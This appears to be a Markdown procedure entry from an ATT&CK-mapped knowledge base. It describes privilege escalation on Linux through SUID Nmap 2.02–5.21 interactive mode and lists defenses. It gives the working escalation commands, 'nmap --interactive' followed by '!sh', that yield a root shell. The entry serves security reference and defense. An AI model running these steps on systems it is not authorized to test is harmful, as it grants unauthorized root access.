---
id: 0d4aed7e-7950-4010-b10c-ab7beb9f7734
type: procedure
verified: true
submitted: false
created_at: '2019-10-09T23:36:48.575743+00:00'
updated_at: '2023-05-29T16:48:53.253841+00:00'
tactics:
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - >-
    [[techniques/Exploitation for Privilege Escalation|T1068 - Exploitation for
    Privilege Escalation]]
sub_techniques: []
platforms:
  - Linux
tags:
  - known vulnerability
  - shell
commands:
  - '[[commands/nmap-interactive-mode]]'
tools:
  - '[[tools/Nmap]]'
validated: true
---

# Nmap-Interactive-Mode-Shell-Escape

## Summary

Exploit the interactive mode vulnerability in Nmap versions 2.02 to 5.21 (with SUID bit) to escape to a shell, potentially gaining root privileges if run as elevated user.

## Description

Older Nmap allows '!' commands in interactive mode to spawn shells. If SUID root, this bypasses restrictions for low-priv users needing root features, leading to full root shell.

## Requirements

- Nmap version 2.02-5.21 installed with SUID (check via ls -l /usr/bin/nmap)
- Low-priv shell access
- No ASLR or other mitigations blocking

## Defense

- Upgrade Nmap to latest version (>5.21)
- Remove SUID bit from nmap (chmod u-s /usr/bin/nmap)
- Restrict execution of network tools for non-root users

## Objectives

1. Confirm vulnerable Nmap with SUID
2. Enter interactive mode and escape to shell
3. Verify escalated privileges

## Instructions

### Step 1: Launch Interactive Mode

**Context**: Start Nmap in interactive mode; if SUID, it runs with elevated perms.

**Command** ([[commands/nmap-interactive-mode]]):
```bash
nmap --interactive
```

> Prompts with 'nmap> '; type 'h' for help.

### Step 2: Escape to Shell

**Context**: Use '!' to break out to a shell; 'sh' or 'bash' spawns the interpreter.

At nmap> prompt: !sh

> Drops to # prompt if root; run id to confirm uid=0(root).
